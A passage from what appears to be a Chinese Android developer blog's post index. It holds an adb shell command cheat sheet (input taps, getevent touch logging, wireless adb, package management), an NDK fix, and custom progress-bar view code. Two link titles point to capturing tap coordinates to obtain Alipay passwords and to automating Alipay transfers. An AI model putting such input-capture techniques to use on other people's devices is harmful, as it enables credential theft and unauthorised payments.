表示传入的数据 -t表示传入的类型\n\n\n\tam start -a android.intent.action.VIEW -d http://www.baidu.com  打开网页\n\n\n\t打开音乐播放器\n\tam start -a android.intent.action.MUSIC_PLAYER \n\tam start -n com.android.music/om.android.music.MusicBrowserActivity \n\n\n\t启动服务\n\tam startservice <服务名称> \n\tam startservice -n com.android.music/com.android.music.MediaPlaybackService (这里-n表示组件) \n\tam startservice -a com.smz.myservice (这里-a表示动作，就是你在Androidmanifest里定义的) \n\n\t停止服务\n\tam stopservice\n\n\n\t发送广播\n\tam broadcast -a <广播动作> \n\tam broadcast -a com.smz.mybroadcast \n\n\n\t启动app\n\tam start -n <packagename>\n\tam start -n com.android.browser/com.android.browser.BrowserActivity\n\n\t杀死进程\n\tam kill <packagename>\n\n\tps|grep <packagename> 查看进程是否存在\n\n\n## pm\n\n\tpm list packages  列出手机所有的包名\n\n\tpm install/uninstall  安装/卸载\n\n## input\n\t\n\tinput text <text> \n\n\tinput keyevent <keycode> \n\n\tinput tap <x> <y>\n\n\tinput swipe <x1> <y1> <x2> <y2> <time>\n\n\n\n## service\n\n\tservice list\n\tservice list|grep com.android\n\n\tservice check xx\n\n\n## activity\n\n\n\n\n## adb常用命令\n\n1.**模拟点击**  \n\t\n\tadb shell input tap 100 100\n\n2.**滑动**  \n\n\tadb shell input swipe x1 y1 x2 y2 \n\tadb input touchscreen swipe x1 y1 x2 y2 100\n\n\tadb shell input swipe 100 100 400 100  300 #左往右\n\tadb shell input swipe 400 100 100 100  300 #右往左\n\tadb shell input swipe 100 100 100 400  300 #上往下\n\tadb shell input swipe 100 400 100 100  300 #下往上\n\tadb shell input swipe 100 100 400 400  300 #上往下斜\n\tadb shell input swipe 400 400 100 100  300 #下往上斜\n\n3.**长按**  \n\n\tadb shell input swipe 100 100 100 100  1000 //在 100 100 位置长按 1000毫秒\n\n\tadb shell input swipe 367 469 367 469 800\n\n4.**打印所有包名**  \n\n\tadb shell pm list packages\n\n\t➜  ~ adb shell pm list packages\n\tpackage:com.huawei.floatMms\n\tpackage:com.android.defcontainer\n\tpackage:com.tencent.mm\n\n5.**打印制定包的apk路径**  \n\n\tadb shell pm path com.android.phone\n\n\t➜  ~ adb shell pm path com.huawei.android.launcher\n\tpackage:/system/app/HwLauncher6.apk\n\n6.**删除制定包**  \n\n\tadb shell pm clear com.test.abc\n\n7.**截图**  \n\n\tadb shell screencap /sdcard/screen.png\n\tadb pull /sdcard/screen.png #下载到本地\n\n8.**获取被点击的位置信息**  \n\n\tadb shell getevent\n\t\n\t>\n\t/dev/input/event0 3 39 3e1\n\t/dev/input/event0 1 14a 1\n\t/dev/input/event0 1 145 1\n\t/dev/input/event0 3 35 406  //x坐标\n\t/dev/input/event0 3 54 1083  //y坐标\n\t/dev/input/event0 0 0 0\n\t/dev/input/event0 3 39 ffffffff\n\t/dev/input/event0 1 14a 0\n\t/dev/input/event0 1 145 0\n\t/dev/input/event0 0 0\n\n\tgetevent -l -c 16\n\t输出所有event设备的基本信息\n\n\tadd device 1: /dev/input/event2\n\t  name:     \"hi6421_on\"\n\tcould not get driver version for /dev/input/mouse0, Not a typewriter\n\tadd device 2: /dev/input/event4\n\t  name:     \"huawei,touchscreen\"\n\tadd device 3: /dev/input/event0\n\t  name:     \"mhl_rcp_dev\"\n\tcould not get driver version for /dev/input/mice, Not a typewriter\n\tadd device 4: /dev/input/event1\n\t  name:     \"hisi_gpio_key.14\"\n\tadd device 5: /dev/input/event3\n\t  name:     \"hi3630_hi6401_CARD Headset Jack\"\n\n\tgetevent -c 10 //输出10条信息后退出\n\tgetevent -l  //将type、code、value以对应的常量名称显示\n\n9.**打开对应的activity**  \n\n\tadb shell am start -n ｛包(package)名｝/｛包名｝.{活动(activity)名称}\n\n\tadb shell am start com.songheng.eastnews/com.oa.eastfirst.activity.WelcomeActivity\n\n10.**获得当前活动窗口的信息，包名以及活动窗体**  \n\n\tadb shell dumpsys window windows | grep mCurrent \n\n11.**包名管理命令，获得对应包名的对应apk路径**  \n\n\tadb shell pm  path com.migu.lobby\n\n12.**使用dumpsys命令可以查看Android手机当前正在运行的Activity**  \n\n\tadb shell dumpsys activity activities | findstr \"Run\"\n\n**查看当前打开的app包名**\n\n顶层activity:  \n\n\tadb shell dumpsys activity top\n\nwindows:  \n\n\tadb shell dumpsys window w |findstr \\/ |findstr name=\n\nmac:  \n\n\tadb shell dumpsys window w |grep \\/ |grep name=\n\n\t➜  ~ adb shell dumpsys window w |grep \\/ |grep name=\n      mSurface=Surface(name=com.weikuai.wknews/com.weikuai.wknews.ui.activity.RegisterActivity)\n\n\n13.**使用 uiautomator dump 获取app上的页面元素**  \n\n\tadb shell uiautomator dump /data/local/tmp/uidump.xml\n\tadb shell uiautomator dump /sdcard/dump.xml\n\tadb pull /sdcard/dump.xml \n\n14.**下载文件**  \n\n\tadb pull /sdcard/demo.mp4 \n\n15.**上传文件**  \n\n\tadb push test.apk /sdcard\n\n16.**息屏**  \n\n\tadb shell input keyevent 26\n\n17.**keyevent**\n\n\tadb shell input keyevent 19 #导航键向下\n\n\tadb shell input keyevent 20 #导航键向下\n\n\tadb shell input keyevent 92 #向上翻页键\n\n    adb shell input keyevent 93 #向下翻页键\n\n\tadb shell input keyevent 4 #返回\n\n\tadb shell input keyevent 3 #Home\n\n\tadb shell input keyevent 6 #挂机\n\n\tadb shell input keyevent 84 #搜索\n\n\tadb shell input keyevent 26 #电源\n\n\tadb shell input keyevent 24 #音量+\n\n\tadb shell input keyevent 25 #音量-\n\n**导航**  \n\n\n\n\n\t3 Home\n\t4 Back\n\t19 Up\n\t20 Down\n\t21 Left\n\t22 Right\n\t23 Select/Ok\n\t24 Volume+\n\t25 Volume-\n\t82 Menu 菜单\n\n\n\tadb shell input text \"ANDROID\" 支持的KEYCODE\n\t0 -->  \"KEYCODE_UNKNOWN\"\n\t1 -->  \"KEYCODE_MENU\"\n\t2 -->  \"KEYCODE_SOFT_RIGHT\"\n\t3 -->  \"KEYCODE_HOME\"\n\t4 -->  \"KEYCODE_BACK\"\n\t5 -->  \"KEYCODE_CALL\" \n\t6 -->  \"KEYCODE_ENDCALL\" \n\t7 -->  \"KEYCODE_0\" \n\t8 -->  \"KEYCODE_1\" \n\t9 -->  \"KEYCODE_2\" \n\t10 -->  \"KEYCODE_3\"\n\t11 -->  \"KEYCODE_4\" \n\t12 -->  \"KEYCODE_5\" \n\t13 -->  \"KEYCODE_6\" \n\t14 -->  \"KEYCODE_7\" \n\t15 -->  \"KEYCODE_8\" \n\t16 -->  \"KEYCODE_9\" \n\t17 -->  \"KEYCODE_STAR\" \n\t18 -->  \"KEYCODE_POUND\" \n\t19 -->  \"KEYCODE_DPAD_UP\" \n\t20 -->  \"KEYCODE_DPAD_DOWN\" \n\t21 -->  \"KEYCODE_DPAD_LEFT\" \n\t22 -->  \"KEYCODE_DPAD_RIGHT\"\n\t23 -->  \"KEYCODE_DPAD_CENTER\"\n\t24 -->  \"KEYCODE_VOLUME_UP\" \n\t25 -->  \"KEYCODE_VOLUME_DOWN\" \n\t26 -->  \"KEYCODE_POWER\" \n\t27 -->  \"KEYCODE_CAMERA\" \n\t28 -->  \"KEYCODE_CLEAR\" \n\t29 -->  \"KEYCODE_A\" \n\t30 -->  \"KEYCODE_B\" \n\t31 -->  \"KEYCODE_C\" \n\t32 -->  \"KEYCODE_D\" \n\t33 -->  \"KEYCODE_E\" \n\t34 -->  \"KEYCODE_F\" \n\t35 -->  \"KEYCODE_G\" \n\t36 -->  \"KEYCODE_H\" \n\t37 -->  \"KEYCODE_I\" \n\t38 -->  \"KEYCODE_J\" \n\t39 -->  \"KEYCODE_K\" \n\t40 -->  \"KEYCODE_L\" \n\t41 -->  \"KEYCODE_M\"\n\t42 -->  \"KEYCODE_N\" \n\t43 -->  \"KEYCODE_O\" \n\t44 -->  \"KEYCODE_P\" \n\t45 -->  \"KEYCODE_Q\" \n\t46 -->  \"KEYCODE_R\" \n\t47 -->  \"KEYCODE_S\" \n\t48 -->  \"KEYCODE_T\" \n\t49 -->  \"KEYCODE_U\" \n\t50 -->  \"KEYCODE_V\" \n\t51 -->  \"KEYCODE_W\" \n\t52 -->  \"KEYCODE_X\"\n\t53 -->  \"KEYCODE_Y\" \n\t54 -->  \"KEYCODE_Z\" \n\t55 -->  \"KEYCODE_COMMA\" \n\t56 -->  \"KEYCODE_PERIOD\"\n\t57 -->  \"KEYCODE_ALT_LEFT\" \n\t58 -->  \"KEYCODE_ALT_RIGHT\" \n\t59 -->  \"KEYCODE_SHIFT_LEFT\" \n\t60 -->  \"KEYCODE_SHIFT_RIGHT\" \n\t61 -->  \"KEYCODE_TAB\" \n\t62 -->  \"KEYCODE_SPACE\" \n\t63 -->  \"KEYCODE_SYM\" \n\t64 -->  \"KEYCODE_EXPLORER\" \n\t65 -->  \"KEYCODE_ENVELOPE\" \n\t66 -->  \"KEYCODE_ENTER\" \n\t67 -->  \"KEYCODE_DEL\" \n\t68 -->  \"KEYCODE_GRAVE\" \n\t69 -->  \"KEYCODE_MINUS\" \n\t70 -->  \"KEYCODE_EQUALS\" \n\t71 -->  \"KEYCODE_LEFT_BRACKET\" \n\t72 -->  \"KEYCODE_RIGHT_BRACKET\" \n\t73 -->  \"KEYCODE_BACKSLASH\"\n\t74 -->  \"KEYCODE_SEMICOLON\" \n\t75 -->  \"KEYCODE_APOSTROPHE\"\n\t76 -->  \"KEYCODE_SLASH\" \n\t77 -->  \"KEYCODE_AT\" \n\t78 -->  \"KEYCODE_NUM\" \n\t79 -->  \"KEYCODE_HEADSETHOOK\" \n\t80 -->  \"KEYCODE_FOCUS\"\n\t81 -->  \"KEYCODE_PLUS\"\n\t82 -->  \"KEYCODE_MENU\"\n\t83 -->  \"KEYCODE_NOTIFICATION\"\n\t84 -->  \"KEYCODE_SEARCH\" \n\t85 -->  \"TAG_LAST_KEYCODE\"  \n\n[adb shell input keyevent值所对应的字符](https://blog.csdn.net/chen825919148/article/details/18732041)  \n[adb命令模拟按键事件 KeyCode](https://blog.csdn.net/jlminghui/article/details/39268419)  \n\n18.**输入框输入**  \n\n\tadb shell input text \"ANDROID\"\n\n19.**利用无线来查看adb shell**\n\n\t> adb tcpip 5555\n\n\t连接：\n\t> adb connect IP:5555\n\n[ADB高级命令](https://blog.csdn.net/fuyuehua22/article/details/45875209)  \n\n20.**查看所有已经连接上的设备**  \n\n\tadb devices\n\n21.**安装卸载**  \n\n\tadb install <apk文件路径>\n\tadb install -r <apk文件路径>     通过install命令来安装apk文件，-r参数可以重新安装某个应用并保留应用数据\n\n\tadb install -r ~/chrome.apk\n\n\t卸载应用：\n\tadb uninstall <软件名>\n\tadb uninstall -k < 软件名>         如果加 -k 参数,为卸载软件但是保留配置和缓存文件\n\t\n\tadb uninstall com.android.chrome\n\n22.**关机命令**  \n\n\tadb shell\n\tsu\n\treboot -p\n\n**重启**  \n\n\treboot\n\n23.**停止App后台进程**\n\n\tadb shell ps | grep tencent.mm   检查指定进程\n\n\tadb shell am force-stop com.tencent.mm 关闭指定进程\n\n\tadb shell pm clear com.tencent.mm  清楚指定进程 不仅会停止APP进程，而且会清除这个APP进程产生的所有数据\n\n## 重启 关机 休眠 唤醒 (还没试)\n\n\tadb shell reboot 重启\n\techo mem > /sys/power/state 休眠\n\techo on > /sys/power/state 唤醒\n\treboot -p 关机\n\n## tips\n### 解决网页滑动问题\n\n\tadb shell input keyevent 19 #导航键向下\n\n\tadb shell input keyevent 20 #导航键向下\n\n\tadb shell input keyevent 92 #向上翻页键\n\t\n    adb shell input keyevent 93 #向下翻页键\n\n---\n\n## 安装apk的问题\n\n\tINSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES\n\t签名冲突\n\n## LINKS\n\n这个没试过还挺有趣的[android adb shell循环模拟点击](https://www.jianshu.com/p/c2120e27ee4c)  \n[Android应用程序 --- WakeLock 保持后台唤醒状态](https://blog.csdn.net/andyhuabing/article/details/8988161)  \n[Android利用root权限开关机、休眠和唤醒](https://blog.csdn.net/benbenxiongyuan/article/details/53032443)  \n[Android adb shell input 命令详解](https://blog.csdn.net/good123_2014/article/details/79107765)  \n[Android开发——后台获取用户点击位置坐标（可获取用户支付宝密码）](https://blog.csdn.net/seu_calvin/article/details/51916845)  \n[Android adb shell启动应用程序的方法](https://www.cnblogs.com/dengqing9393/p/7210479.html)  \n[Android通过ADB命令获取当前运行的Activity](https://blog.csdn.net/owenchan1987/article/details/52774394)  \n[Android adb shell启动应用程序的方法](https://www.cnblogs.com/dengqing9393/p/7210479.html)  \n[PC通过ADB控制Android手机模拟点击，滑动，输入等事件（包括控制多台Android手机）](https://blog.csdn.net/aoaoxiexie/article/details/53464716)  \n[Android开发——使用ADB Shell命令实现模拟点击（支付宝自动转账实现）](https://blog.csdn.net/seu_calvin/article/details/51916530)  \n[通过adb shell获取当前窗口信息](https://blog.csdn.net/wyyyh9458/article/details/83550004)  \n[检测弹窗与蒙层的方法 (Android )](https://testerhome.com/topics/11136)  \n[使用 uiautomator dump 获取app上的页面元素](https://blog.csdn.net/qq_36350532/article/details/81708339)  \n[通过 python 调用 adb 命令实现用元素名称、id、class 定位元素](https://testerhome.com/topics/1047)  \n[通过adb获取安卓应用屏幕所有控件信息](https://blog.csdn.net/hyhdcl/article/details/53340421)  \n[使用adb命令获取设备UI(hierarchy)信息](https://blog.csdn.net/henni_719/article/details/72953251)  \n[Android shell获取和模拟点击事件](https://blog.csdn.net/beyond702/article/details/69258932)  \n[通过adb shell命令查看当前与用户交互的activity](https://blog.csdn.net/hty1053240123/article/details/54312614)  \n[adb shell 常用命令](https://www.cnblogs.com/JianXu/p/5161179.html)  \n[玩转ADB命令（ADB命令使用大全）](https://blog.csdn.net/zhonglunshun/article/details/78362439)  \n[Android系统文件目录路径说明](https://www.cnblogs.com/CVstyle/p/6389966.html)  \n[彻底搞懂Android文件存储---内部存储，外部存储以及各种存储路径解惑](https://blog.csdn.net/u010937230/article/details/73303034/)  \n[Android--多线程之Handler](https://www.cnblogs.com/shirley-1019/p/3557800.html)  \n[android在adb下模拟长按事件](https://zhuanlan.zhihu.com/p/26236061)  \n[android 自动化测试检测弹窗或蒙层](https://blog.csdn.net/yeshennet/article/details/78667777)  \n[Android ADB命令大全(通过ADB命令查看wifi密码、MAC地址、设备信息、操作文件、查看文件、日志信息、卸载、启动和安装APK等)](https://zmywly8866.github.io/2015/01/24/all-adb-command.html)  \n[使用adb命令停止APP后台进程的方法](https://yq.aliyun.com/articles/62892)  \n\n","tags":["android","android逆向"],"categories":["android逆向"]},{"title":"android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android","url":"/post/3707592036.html","content":"\n主要是缺少这个文件 mips64el-linux-android  \n同理一些相同NDK目录可能也是缺少某些文件  \n\n\tndk目录\n\t/Users/shaomiao/Library/Android/sdk/ndk-bundle\n\n1.打开项目local.properties文件\n\n\tProject/local.properties\n\n\tndk.dir\n\n2.打开ndk.dir文件夹\n\n3.下载对应的ndk  \n\n[ndk下载](https://developer.android.com/ndk/downloads/?hl=zh-cn)  \n\n4.打开toolchains文件夹  \n\n5.从下载的ndk目录中toolchains/mips64el-linux-android-4.9 复制到 项目ndk-bundle/toolchains目录里\n\n6.make project\n\t\n\tbuild/Make Project\n\n## LINKS\n\n[完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android](https://blog.csdn.net/qq_24118527/article/details/82867864)  ","tags":["android"],"categories":["android"]},{"title":"android里的文本样式","url":"/post/3707607800.html","content":"\n## 修改text的大小和颜色\n\nstrings.xml  \n\n\t<string name=\"str_event_statistics\">事件统计 &lt;small&gt;（近 %1$s 场）&lt;small&gt;</string>\n\njava  \n\n    String textSource = context.getResources().getString(R.string.str_event_statistics)+\"<small>（近10场）</small>\";\n\n\tString textSource = context.getResources().getString(R.string.str_event_statistics,\"11\");\n    title_tv.setText(Html.fromHtml(textSource));\n\n    String textSource = \"江苏苏宁VS上海上港-<font color='#FF6059'>1胜</font> <font color='#41CFFF'>1平</font> <font color='#7ED321'>3负</font>\";\n        viewHolder.tv1.setText(Html.fromHtml(textSource));\n\n\n[给TextView加上多彩效果：改变部分字体的大小和颜色](https://blog.csdn.net/singwhatiwanna/article/details/18363899)  \n[android中string.xml中%1$s、%1$d等的用法](https://www.cnblogs.com/Eric-zhao/p/5230007.html)  \n[修改TextView中部分文本的字体及颜色](https://www.jianshu.com/p/f6cef78e8652)  ","tags":["android"],"categories":["android"]},{"title":"android里layout.xml的include","url":"/post/2155240333.html","content":"\n\tinclude 两个一样的layout\n\n    通过给 include标签设置id 分别绑定子布局的控件\n\n    <LinearLayout\n        xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:orientation=\"vertical\">\n\n        <View\n            android:background=\"@color/colorE7E7E7\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"0.2dp\"/>\n\n        <LinearLayout\n            android:layout_marginTop=\"15dp\"\n            android:orientation=\"horizontal\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"wrap_content\">\n\n\n        <include\n            android:id=\"@+id/item1\"\n            android:layout_weight=\"1\"\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:layout_gravity=\"center\"\n            layout=\"@layout/item_game_record_head_block\"/>\n\n\n        <include\n            android:id=\"@+id/item2\"\n            android:layout_weight=\"1\"\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:layout_gravity=\"center\"\n            layout=\"@layout/item_game_record_head_block\"/>\n        </LinearLayout>\n\n    </LinearLayout>\n\n\n    View view = LayoutInflater.from(context).inflate(R.layout.item_game_record_head, getRootView((Activity) context), false);\n    View item1 = view.findViewById(R.id.item1);\n    View item2 = view.findViewById(R.id.item2);\n    TextView item1_tv1,item1_tv2,item1_tv3,item1_tv4,item1_tv5,item1_tv6;\n    TextView item2_tv1,item2_tv2,item2_tv3,item2_tv4,item2_tv5,item2_tv6;\n    ImageView item1_iv1,item2_iv1;\n    item1_tv1 = item1.findViewById(R.id.tv1);\n    item1_tv2 = item1.findViewById(R.id.tv2);\n    item1_tv3 = item1.findViewById(R.id.tv3);\n    item1_tv4 = item1.findViewById(R.id.tv4);\n    item1_tv5 = item1.findViewById(R.id.tv5);\n    item1_tv6 = item1.findViewById(R.id.tv6);\n    item1_iv1 = item1.findViewById(R.id.iv1);\n\n    item1_tv1.setText(\"联赛排名第5名\");\n    item1_tv2.setText(\"10-9-7\");\n    item1_tv3.setText(\"胜-平-负\");\n    item1_tv4.setText(\"37-29\");\n    item1_tv5.setText(\"进球-失球\");\n    item1_tv6.setText(\"9连败中\");\n    //        Glide.with(context).load(\"\").into(item1_iv1);\n\n    item2_tv1 = item2.findViewById(R.id.tv1);\n    item2_tv2 = item2.findViewById(R.id.tv2);\n    item2_tv3 = item2.findViewById(R.id.tv3);\n    item2_tv4 = item2.findViewById(R.id.tv4);\n    item2_tv5 = item2.findViewById(R.id.tv5);\n    item2_tv6 = item2.findViewById(R.id.tv6);\n    item2_iv1 = item2.findViewById(R.id.iv1);\n\n    item2_tv1.setText(\"联盟排名第1名\");\n    item2_tv2.setText(\"18-5-3\");\n    item2_tv3.setText(\"胜-平-负\");\n    item2_tv4.setText(\"64-23\");\n    item2_tv5.setText(\"进球-失球\");\n    item2_tv6.setText(\"1连胜中\");\n","tags":["android"],"categories":["android"]},{"title":"android自定义view圆形进度条","url":"/post/2381054113.html","content":"\n![效果图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/03.jpg)\n\n## 代码\n\nattrs.xml  \n\n    <declare-styleable name=\"RingProgressBarView\">\n        <attr name=\"circle_radius\" format=\"dimension\"/>\n        <attr name=\"stroke_width\" format=\"dimension\"/>\n        <attr name=\"circle_color\" format=\"color\"/>\n        <attr name=\"ring_background_color\" format=\"color\"/>\n        <attr name=\"ring_cor\" forLineProgressBarViewmat=\"color\"/>\n        <attr name=\"font_color\" format=\"color\"/>\n        <attr name=\"font_size\" format=\"dimension\"/>\n    </declare-styleable>\n\n\nRingProgressBarView.java  \n\n    public class RingProgressBarView extends View {\n\n        // 画实心圆的画笔\n        private Paint mCirclePaint;\n        // 画圆环的画笔\n        private Paint mRingPaint;\n        // 画圆环的画笔背景色\n        private Paint mRingPaintBg;\n        // 画字体的画笔\n        private Paint mTextPaint;\n        // 圆形颜色\n        private int mCircleColor;\n        // 圆环颜色\n        private int mRingColor;\n        // 圆环背景颜色\n        private int mRingBgColor;\n        // 字体颜色\n        private int mTextColor;\n        // 字体大小\n        private float mTextSize;\n        // 半径\n        private float mRadius;\n        // 圆环半径\n        private float mRingRadius;\n        // 圆环宽度\n        private float mStrokeWidth;\n        // 圆心x坐标\n        private int mXCenter;\n        // 圆心y坐标\n        private int mYCenter;\n        // 字的长度\n        private float mTxtWidth;\n        // 字的高度\n        private float mTxtHeight;\n        // 总进度\n        private int mTotalProgress = 100;\n        // 当前进度\n        private float mProgress;\n\n        private String mProgressTxt;\n\n        public RingProgressBarView(Context context, @Nullable AttributeSet attrs) {\n            super(context, attrs);\n            initAttrs(context, attrs);\n            initVariable();\n        }\n\n        private void initAttrs(Context context,AttributeSet attrs) {\n            TypedArray typeArray = context.getTheme().obtainStyledAttributes(attrs,\n                    R.styleable.RingProgressBarView, 0, 0);\n            mRadius = typeArray.getDimension(R.styleable.RingProgressBarView_circle_radius, dp2px(30));\n            mStrokeWidth = typeArray.getDimension(R.styleable.RingProgressBarView_stroke_width,dp2px(6));\n            mCircleColor = typeArray.getColor(R.styleable.RingProgressBarView_circle_color, Color.parseColor(\"#ffffff\"));\n            mRingColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_cor, Color.parseColor(\"#FF6059\"));\n            mRingBgColor = typeArray.getColor(R.styleable.RingProgressBarView_ring_background_color,Color.parseColor(\"#E3E2E2\"));\n            mTextColor = typeArray.getColor(R.styleable.RingProgressBarView_font_color,Color.parseColor(\"#2E3D45\"));\n            mTextSize = typeArray.getDimension(R.styleable.RingProgressBarView_font_size,mRadius / 3);\n            mRingRadius = mRadius + mStrokeWidth / 2;\n        }\n\n        private void initVariable() {\n            //内圆\n            mCirclePaint = getPaint(Paint.Style.FILL,mCircleColor);\n\n\n            //外圆弧背景\n            mRingPaintBg = getPaint(Paint.Style.STROKE,mRingBgColor,mStrokeWidth);\n\n            //外圆弧\n            mRingPaint = getPaint(Paint.Style.STROKE,mRingColor,mStrokeWidth);\n            mRingPaint.setStrokeCap(Paint.Cap.ROUND);//设置线冒样式，有圆 有方\n\n            //中间字\n            mTextPaint = getPaint(Paint.Style.FILL,mTextColor);\n            mTextPaint.setTextSize(mTextSize);\n\n            Paint.FontMetrics fm = mTextPaint.getFontMetrics();\n            mTxtHeight = (int) Math.ceil(fm.descent - fm.ascent);\n        }\n\n        private Paint getPaint(Paint.Style style,int color){\n            Paint paint = new Paint(Paint.ANTI_ALIAS_FLAG); //抗锯齿标志\n            paint.setStyle(style);\n            paint.setColor(color);\n            paint.setAntiAlias(true);\n            return paint;\n        }\n        private Paint getPaint(Paint.Style style,int color,float width){\n            Paint paint = getPaint(style,color);\n            paint.setStrokeWidth(width);\n            return paint;\n        }\n\n        @Override\n        protected void onDraw(Canvas canvas) {\n    //        super.onDraw(canvas);\n            mXCenter = getWidth() / 2;\n            mYCenter = getHeight() / 2;\n\n            //内圆\n            canvas.drawCircle(mXCenter, mYCenter, mRadius, mCirclePaint);\n\n            //外圆弧背景\n            RectF oval1 = new RectF();\n            oval1.left = (mXCenter - mRingRadius);\n            oval1.top = (mYCenter - mRingRadius);\n            oval1.right = mRingRadius * 2 + (mXCenter - mRingRadius);\n            oval1.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);\n            canvas.drawArc(oval1, 0, 360, false, mRingPaintBg); //圆弧所在的椭圆对象、圆弧的起始角度、圆弧的角度、是否显示半径连线\n\n            //外圆弧\n            if (mProgress > 0 ) {\n                RectF oval = new RectF();\n                oval.left = (mXCenter - mRingRadius);\n                oval.top = (mYCenter - mRingRadius);\n                oval.right = mRingRadius * 2 + (mXCenter - mRingRadius);\n                oval.bottom = mRingRadius * 2 + (mYCenter - mRingRadius);\n                canvas.drawArc(oval, -90, -(((float)mProgress / mTotalProgress) * 360), false, mRingPaint); //\n\n                //字体\n                String txt = mProgressTxt + \"%\";\n                mTxtWidth = mTextPaint.measureText(txt, 0, txt.length());\n                canvas.drawText(txt, mXCenter - mTxtWidth / 2, mYCenter + mTxtHeight / 4, mTextPaint);\n            }\n        }\n\n        //设置进度\n        public void setProgress(float progress) {\n            final ValueAnimator anim = ValueAnimator.ofFloat(0,progress);\n            anim.setDuration(3000);\n            anim.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n                @Override\n                public void onAnimationUpdate(ValueAnimator animator) {\n                    mProgress  = (float)animator.getAnimatedValue();\n                    DecimalFormat df2 = new DecimalFormat(\"###.00\");\n                    mProgressTxt= df2.format(mProgress);\n                    invalidate();\n                }\n            });\n            anim.start();\n        }\n        protected int dp2px(int dpVal) {\n            return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP,dpVal,getResources().getDisplayMetrics());\n        }\n    }\n\n\nactivity_ring_progress_bar.xml  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n                                                 xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n                                                 android:layout_width=\"match_parent\"\n                                                 android:layout_height=\"match_parent\">\n\n        <com.demo.android_view.mview.RingProgressBarView\n                android:id=\"@+id/rpbv\"\n                android:layout_width=\"120dp\"\n                android:layout_height=\"120dp\"/>\n    </android.support.constraint.ConstraintLayout>\n\nRingProgressBarActivity.java  \n\n    public class RingProgressBarActivity extends AppCompatActivity {\n\n        private RingProgressBarView rpbv;\n\n        @Override\n        protected void onCreate(@Nullable Bundle savedInstanceState) {\n            super.onCreate(savedInstanceState);\n            setContentView(R.layout.activity_ring_progress_bar);\n            rpbv = findViewById(R.id.rpbv);\n            rpbv.setProgress(100f);\n        }\n    }\n\n\n## 源代码\n[源代码](https://github.com/tea9/android_view)  \n\n## LINKS\n[Android 自定义漂亮的圆形进度条](https://blog.csdn.net/qq_32519693/article/details/76726525)  \n[Android自定义View之画圆环(进阶篇:圆形进度条)](https://blog.csdn.net/zhangqunshuai/article/details/80760277)  \n[Android 自定义View实例之进度圆环](https://blog.csdn.net/mengks1987/article/details/77771465)  \n[Android花样loading进度条（二）-简单环形进度条](https://blog.csdn.net/ahuyangdong/article/details/79942824)  \n[Android自定义圆形进度条](https://www.jianshu.com/p/fd5616685d3d)  \n[android自定义控件之圆形进度条（带动画）](https://blog.csdn.net/anonymousprogrammer/article/details/65634886)  \n\n","tags":["android"],"categories":["android"]},{"title":"android自定义View线进度条","url":"/post/3456428152.html","content":"\n![效果图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/24/01.jpg)\n\n## 思路\n\n画一条线没什么难度用`canvas.drawLine()`就可以，主要的是根据效果图有两种笔的效果，一种圆头一种方头，所以我的思路是先用圆头笔画个2px宽的路径，在用方头笔画剩余路径。  \n\n## Paint\n\n\tpaint.setStyle();\n\tPaint.Style.FILL 填充内部\n\tPaint.Style.FILL_AND_STROKE 填充内部和描边\n\tPaint.Style.STROKE 仅描边\n\n\n\tpaint.setStrokeCap(); 设置线帽样式\n\tPaint.Cap.BUTT; 无线帽\n    Paint.Cap.ROUND; 圆形线帽\n    Paint.Cap.SQUARE; 方形线帽\n\n[自定义控件三部曲之绘图篇(七)——Paint之函数大汇总](https://blog.csdn.net/harvic880925/article/details/51010839)  \n\n## 关键代码\n\n\tnum_a_paint.setStrokeCap(Paint.Cap.ROUND); // 先用圆头笔画\n\tcanvas.drawLine(startX, height / 2, startX + 2, height / 2, num_a_paint);\n\tnum_a_paint.setStrokeCap(Paint.Cap.BUTT); // 改成方头笔\n\tcanvas.drawLine(startX, height / 2, length_a, height / 2, num_a_paint);\n\tnum_b_paint.setStrokeCap(Paint.Cap.ROUND);\n\tcanvas.drawLine(endX, height / 2, endX - 2, height / 2, num_b_paint);\n\tnum_b_paint.setStrokeCap(Paint.Cap.BUTT);\n\tcanvas.drawLine(endX, height / 2, length_b - 2, height / 2, num_b_paint);\n\n## 全部代码\n\nattrs.xml  \n\n    <declare-styleable name=\"LineProgressBarView\">\n        <attr name=\"bar_width\" format=\"dimension\"/>\n        <attr name=\"bar_height\" format=\"dimension\"/>\n        <attr name=\"margin\" format=\"integer\"/>\n        <attr name=\"num_a\" format=\"float\"/>\n        <attr name=\"num_b\" format=\"float\"/>\n        <attr name=\"bar_type\" format=\"integer\"/>\n        <attr name=\"background_color\" format=\"color\"/>\n        <attr name=\"color_a\" format=\"color\"/>\n        <attr name=\"color_b\" format=\"color\"/>\n    </declare-styleable>\n\n\tpublic class LineProgressBarView extends View {\n\n\t    private Context context;\n\t    private int background_color,color_a,color_b,margin; // margin 左右边距\n\t    private float bar_height,bar_width;\n\t    private float num_a,num_b;\n\t    private Paint back_paint,num_a_paint,num_b_paint;\n\t    private int width,height;\n\t    private int type;\n\t    // 线的X起始左标\n\t    private float startX;\n\t    private float endX;\n\t    public LineProgressBarView(Context context, @Nullable AttributeSet attrs) {\n\t        super(context, attrs);\n\t        this.context = context;\n\t        getAtt(attrs);\n\t        initPaint();\n\t        setLayerType(View.LAYER_TYPE_SOFTWARE, null); // 硬件加速\n\t    }\n\t    private void getAtt(AttributeSet attrs) {\n\t        TypedArray typedArray = context.obtainStyledAttributes(attrs,R.styleable.LineProgressBarView);\n\t        background_color = typedArray.getColor(R.styleable.LineProgressBarView_background_color,Color.parseColor(\"#E3E2E2\"));\n\t        color_a = 